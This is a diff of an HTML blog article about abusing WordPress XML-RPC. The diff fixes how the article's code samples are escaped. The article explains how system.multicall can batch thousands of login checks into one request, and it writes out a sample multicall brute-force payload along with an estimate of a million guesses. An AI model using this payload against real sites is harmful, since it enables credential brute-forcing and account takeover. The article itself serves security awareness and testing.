@@ -12,96 +12,96 @@
 	<p>To understand the vulnerability, it’s important to understand the basics of the XML remote procedure protocol (XML-RPC).</p>
 	<p>XML-RPC uses XML encoding over HTTP to provide a remote procedure call protocol. It’s commonly used to execute various <a href="https://codex.wordpress.org/XML-RPC_WordPress_API">functions in a WordPress instance</a> for APIs and other automated tasks. Requests that modify, manipulate, or view data using XML-RPC require user credentials with sufficient permissions.</p>
 	<p>Here is an example that requests a list of the user’s blogs:</p>
-	<pre class="language-bash"><code class="language-bash"><!--?xml version="1.0" encoding="iso-8859-1"?-->
-<methodcall>
-<methodname>wp.getUsersBlogs</methodname>
-<params>
- <param>
-  <value>
-   <string>admin</string>
-  </value>
- 
- <param>
-  <value>
-   <string>password123</string>
-  </value>
- 
-</params>
-</methodcall></code></pre>
+	<pre class="language-bash"><code class="language-bash">&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;
+&lt;methodCall&gt;
+&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
+&lt;params&gt;
+ &lt;param&gt;
+  &lt;value&gt;
+   &lt;string&gt;admin&lt;/string&gt;
+  &lt;/value&gt;
+ &lt;/param&gt;
+ &lt;param&gt;
+  &lt;value&gt;
+   &lt;string&gt;password123&lt;/string&gt;
+  &lt;/value&gt;
+ &lt;/param&gt;
+&lt;/params&gt;
+&lt;/methodCall&gt;</code></pre>
 	<p>The server responds with an XML message containing the requested information. The <code>isAdmin</code> name-value pair tells us our credentials were correct:</p>
-	<pre class="language-bash"><code class="language-bash"><!--?xml version="1.0" encoding="UTF-8"?-->
-<methodresponse>
-<params>
-	<param>
-	  <value>
-	  <array><data>
-	  <value><struct>
-	  <member>
-		<name>isAdmin</name>
-		<value><boolean>1</boolean></value>
-	  </member>
-	  <member>
-		<name>url</name>
-		<value><string>http://example.com/</string></value>
-	  </member>
-	  <member>
-		<name>blogid</name>
-		<value><string>1</string></value>
-	  </member>
-	  <member>
-		<name>blogName</name>
-		<value><string>testing</string></value>
-	  </member>
-	  <member>
-		<name>xmlrpc</name>
-		<value><string>http://example.com/xmlrpc.php</string></value>
-	  </member>
-	  </struct></value>
-	  </data></array>
-	  </value>
-	
-</params>
-</methodresponse></code></pre>
+	<pre class="language-bash"><code class="language-bash">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;methodResponse&gt;
+&lt;params&gt;
+	&lt;param&gt;
+	  &lt;value&gt;
+	  &lt;array&gt;&lt;data&gt;
+	  &lt;value&gt;&lt;struct&gt;
+	  &lt;member&gt;
+		&lt;name&gt;isAdmin&lt;/name&gt;
+		&lt;value&gt;&lt;boolean&gt;1&lt;/boolean&gt;&lt;/value&gt;
+	  &lt;/member&gt;
+	  &lt;member&gt;
+		&lt;name&gt;url&lt;/name&gt;
+		&lt;value&gt;&lt;string&gt;http://example.com/&lt;/string&gt;&lt;/value&gt;
+	  &lt;/member&gt;
+	  &lt;member&gt;
+		&lt;name&gt;blogid&lt;/name&gt;
+		&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;
+	  &lt;/member&gt;
+	  &lt;member&gt;
+		&lt;name&gt;blogName&lt;/name&gt;
+		&lt;value&gt;&lt;string&gt;testing&lt;/string&gt;&lt;/value&gt;
+	  &lt;/member&gt;
+	  &lt;member&gt;
+		&lt;name&gt;xmlrpc&lt;/name&gt;
+		&lt;value&gt;&lt;string&gt;http://example.com/xmlrpc.php&lt;/string&gt;&lt;/value&gt;
+	  &lt;/member&gt;
+	  &lt;/struct&gt;&lt;/value&gt;
+	  &lt;/data&gt;&lt;/array&gt;
+	  &lt;/value&gt;
+	&lt;/param&gt;
+&lt;/params&gt;
+&lt;/methodResponse&gt;</code></pre>
 	<p>As shown in this request, you must provide proper authentication to get a successful response. You can, in theory, create a script that tries different combinations of the username and password, but that is a noisy option that isn’t very effective and is easily detected (the server logs would show a flood of failed login attempts).</p>
 	<p>This is where the <code>system.multicall</code> functionality comes into play. You can run multiple methods with a single HTTP request. This is useful for mass editing blogs or deleting large numbers of comments, etc. Any method that requires authentication can be abused to brute force credentials. Here is what a sample XML <code>system.multicall</code> payload would look like:</p>
-	<pre class="language-bash"><code class="language-bash"><!--?xml version="1.0"?-->
-<methodcall>
-<methodname>system.multicall</methodname>
-<params>
-  <param><value><array><data>
-  <value><struct>
-  <member>
-	<name>methodName</name>
-	<value><string>wp.getUsersBlogs</string></value>
-  </member>
-  <member>
-	<name>params</name><value><array><data>
-	<value><array><data>
-	<value><string>admin</string></value>
-	<value><string>password</string></value>
-	</data></array></value>
-	</data></array></value>
-  </member>
-  </struct></value>
-  <value><struct>
-  <member>
-	<name>methodName</name>
-	<value><string>wp.getUsersBlogs</string></value>
-  </member>
-  <member>
-	<name>params</name>
-	<value><array><data>
-	<value><array><data>
-	  <value><string>admin</string></value>
-	  <value><string>password</string></value>
-	  </data></array></value>
-	</data></array></value>
-  </member>
-  </struct></value>
-  </data></array></value>
-  
-</params>
-</methodcall></code></pre>
+	<pre class="language-bash"><code class="language-bash">&lt;?xml version="1.0"?&gt;
+&lt;methodCall&gt;
+&lt;methodName&gt;system.multicall&lt;/methodName&gt;
+&lt;params&gt;
+  &lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
+  &lt;value&gt;&lt;struct&gt;
+  &lt;member&gt;
+	&lt;name&gt;methodName&lt;/name&gt;
+	&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+  &lt;/member&gt;
+  &lt;member&gt;
+	&lt;name&gt;params&lt;/name&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
+	&lt;value&gt;&lt;array&gt;&lt;data&gt;
+	&lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;
+	&lt;value&gt;&lt;string&gt;password&lt;/string&gt;&lt;/value&gt;
+	&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;
+	&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;
+  &lt;/member&gt;
+  &lt;/struct&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;struct&gt;
+  &lt;member&gt;
+	&lt;name&gt;methodName&lt;/name&gt;
+	&lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+  &lt;/member&gt;
+  &lt;member&gt;
+	&lt;name&gt;params&lt;/name&gt;
+	&lt;value&gt;&lt;array&gt;&lt;data&gt;
+	&lt;value&gt;&lt;array&gt;&lt;data&gt;
+	  &lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;
+	  &lt;value&gt;&lt;string&gt;password&lt;/string&gt;&lt;/value&gt;
+	  &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;
+	&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;
+  &lt;/member&gt;
+  &lt;/struct&gt;&lt;/value&gt;
+  &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;
+  &lt;/param&gt;
+&lt;/params&gt;
+&lt;/methodCall&gt;</code></pre>
 	<p>As you can see, this can lead to very obvious abuse.</p>
 	<h3>Exploitation</h3>
 	<p>During testing, I was able to call the method <code>wp.getUserBlogs</code> 1,000 times in a single HTTP request (limited only by PHP memory issues). If a user creates a simple shell loop that executes one thousand times and runs a PHP script that crafts an HTTP request with one thousand method calls all requiring authentication, then that user would be able to try one million unique logins in a very short period of time.</p>
